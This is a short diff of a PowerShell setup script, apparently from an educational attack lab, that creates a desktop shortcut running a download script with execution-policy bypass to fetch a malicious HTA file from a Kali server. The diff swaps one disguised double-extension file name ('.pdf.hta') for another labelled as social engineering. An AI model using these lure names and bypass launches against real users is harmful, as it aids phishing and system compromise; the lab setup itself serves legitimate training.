@@ -19,7 +19,7 @@ $DownloadScriptPath = "C:\vagrant\exploits\hta\download_hta_powershell.ps1"
 if (Test-Path $DownloadScriptPath) {
     $Shortcut = $WshShell.CreateShortcut("$DesktopPath\Download_Exploit_from_Kali.lnk")
     $Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
-    $Shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$DownloadScriptPath`" -FileName Q4_Financial_Report_EXE.pdf.hta"
+    $Shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$DownloadScriptPath`" -FileName Joan_Espinach_hta_social_engineering.pdf.hta"
     $Shortcut.Description = "Download malicious HTA file from Kali HTTP server (Educational Lab)"
     $Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,13"  # Download icon
     $Shortcut.WorkingDirectory = "$DesktopPath"
